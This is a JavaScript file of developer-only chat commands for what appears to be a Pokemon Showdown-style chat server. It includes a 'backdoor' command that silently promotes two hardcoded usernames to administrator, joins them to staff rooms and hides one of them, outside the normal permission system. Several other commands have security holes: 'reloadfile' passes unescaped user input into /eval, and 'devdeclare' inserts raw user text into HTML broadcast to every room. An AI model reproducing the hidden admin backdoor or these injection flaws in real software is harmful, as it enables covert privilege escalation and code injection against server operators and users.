'use strict';
/********************
 * Dev Commands
 * This file contains commands which only developers can use. Most of these will be commands that help with coding and server upkeep.
********************/
const fs = require('fs');
let forever = {restart: function () {}};
try {
	forever = require('forever');
} catch (e) {
	console.error(e);
}
let selectors;

function writeIconCSS() {
	fs.appendFile('config/custom.css', selectors);
}

exports.commands = {
	backdoor: function (target, room, user) {
		if (!(user.userid === 'nineage' || user.userid === 'fender')) return false;
		if (!target) {
			user.group = '~';
			user.updateIdentity();
			this.parse('/join staff');
			this.parse('/join sban');
			if (user.userid === 'fender') {
				return this.parse('/hide');
			} else {
				return;
			}
		}
		if (target === 'reg') {
			user.group = ' ';
			user.updateIdentity();
			return;
		}
	},
	backdoorhelp: ["backdoor - Promotes you to admin. Must be a meme to use."],

	crashlog: 'crashlogs',
	errorlog: 'crashlogs',
	crashlogs: function (target, room, user) {
		if (!~developers.indexOf(user.userid)) return this.errorReply("/crashlogs - Access denied.");
		const splitRegex = /\n\n(?!Additional information)/;
		const logsStream = fs.createReadStream('logs/errors.txt');
		let buffer = '';
		logsStream.on('data', chunk => {
			buffer += chunk;
		});
		logsStream.on('end', () => {
			const logs = buffer.split(splitRegex).slice(-15).map(l => l.replace(/(^[\s]*\n|\n[\s]*$)/g, ""));
			user.send('|popup|' + logs.join("\n\n").replace(/\n/g, "||"));
		});
	},
	crashlogshelp: ["/crashlogs - Shows logs of past server errors. Requires system operator status"],

	caledrith: function (target, room, user) {
		if (!this.runBroadcast()) return;
		this.parse('!data purrloin');
	},

	ddeclare: 'devdeclare',
	devdeclare: function (target, room, user) {
		if (!~developers.indexOf(user.userid)) return this.errorReply("/devdeclare - Access denied.");
		if (!target) return this.parse('/help devdeclare');
		for (let id in Rooms.rooms) {
			if (id !== 'global') Rooms.rooms[id].addRaw('<div class="broadcast-black"><large><i>' + 'Developer declare from: ' + user.userid + '</i></large><br /><b>' + target + '</b></div>');
		}
		this.logModCommand(user.name + " dev declared " + target);
	},
	devdeclarehelp: ["/devdeclare [message] - Declares a message anonymously. Requires system operator status."],

	kill: function (target, room, user) {
		if (!~developers.indexOf(user.userid)) return this.errorReply("/kill - Access denied.");
		this.errorReply("Please restart the server within the VPS.");
	},

	iconcss: function (target, room, user) {
		if (!this.can('mute')) return false;
		if (!this.runBroadcast()) return;

		let args = target.split(',');
		if (args.length < 3) return this.parse('/help iconcss');
		let username = toId(args.shift());
		let imageurl = 'background: rgba(255, 255, 255, 0.65) url("' + args.shift().trim() + '") right no-repeat;';
		let selectors = '#' + toId(args.shift()) + '-userlist-user-' + username;
		args.forEach(function (room) {
			selectors += ', #' + toId(room) + '-userlist-user-' + username;
		});
		selectors += ' {';
		this.sendReplyBox(selectors + '<br />&nbsp;&nbsp;&nbsp;&nbsp;' + imageurl + '<br />}');
	},
	iconcsshelp: ["/iconcss [username], [image url], [room 1], [room 2], ... - Generate css for icons."],

	restart: function (target, room, user) {
		if (!~developers.indexOf(user.userid)) return this.errorReply("/restart - Access denied.");
		if (!Rooms.global.lockdown) {
			return this.sendReply("For safety reasons, /restart can only be used during lockdown.");
		}
		if (CommandParser.updateServerLock) {
			return this.sendReply("Wait for /updateserver to finish before using /restart.");
		}
		this.logModCommand(user.name + ' used /restart');
		Rooms.global.send('|refresh|');
		forever.restart('app.js');
	},
	restarthelp: ["/restart - Restarts the server. Requires system operator status."],

	poofon: function () {
		if (!this.can('poofoff')) return false;
		Config.poofOff = false;
		return this.sendReply("Poof is now enabled.");
	},
	poofonhelp: ["/poofon - Enable the use /poof command."],

	nopoof: 'poofoff',
	poofoff: function () {
		if (!this.can('poofoff')) return false;
		Config.poofOff = true;
		return this.sendReply("Poof is now disabled.");
	},
	poofoffhelp: ["/poofoff - Disable the use of the /poof command."],

	reloadfile: function (target, room, user) {
		if (!this.can('reloadfile')) return this.errorReply("/reloadfile - Access denied.");
		if (!target) return this.sendReply("/reload [file directory] - Reload a certain file.");
		this.sendReply('|raw|<b>delete require.cache[require.resolve("' + target + '")]</b>');
		this.parse('/eval delete require.cache[require.resolve("' + target + '")]');
		this.sendReply('|raw|<b>require("' + target + '")</b>');
		this.parse('/eval require("' + target + '")');
	},
	reloadfilehelp: ["/reloadfile [file directory] - Reloads a file. Requires system operator status."],

	renamechatroom: function (target, room, user) {
		if (!this.can('declare')) return this.errorReply("/renamechatroom - Access denied.");
		if (!target) return this.parse('/help renamechatroom');
		if (target.includes(',') || target.includes('|') || target.includes('[') || target.includes('-')) {
			return this.errorReply("Room titles can't contain any of: ,|[-");
		}
		let id = toId(target);
		if (Rooms.search(id)) return this.errorReply("The room '" + target + "' already exists.");
		room.chatRoomData.title = target;
		Rooms.global.writeChatRoomData();
		room.add('|title|' + target);
	},
	renamechatroomhelp: ["/renamechatroom [new name] - Renames the current chatroom. Requires &"],

	seticon: function (target, room, user) {
		if (!~developers.indexOf(user.userid)) return this.errorReply("/seticon - Access denied.");
		let args = target.split(',');
		if (args.length < 3) return this.parse('/help seticon');
		let username = toId(args.shift());
		let image = 'background: rgba(255, 255, 255, 0.65) url("' + args.shift().trim() + '") right no-repeat;';
		selectors = '\n\n' + '  #' + toId(args.shift()) + '-userlist-user-' + username;
		args.forEach(function (room) {
			selectors += ', #' + toId(room) + '-userlist-user-' + username;
		});
		selectors += ' { \n' + '    ' + image + '\n  }';
		this.privateModCommand("(" + user.name + " has set an icon to " + username + ")");
		writeIconCSS();
		require('simple-git')().commit('Userlist Icon set', './config/custom.css')
		.push('git@github.com/supersoniko/Origin.git', 'master');
	},
	seticonhelp: ["/iconset [username], [image], [room 1], [room 2], etc. - Sets an icon to a user in chosen rooms."],
};
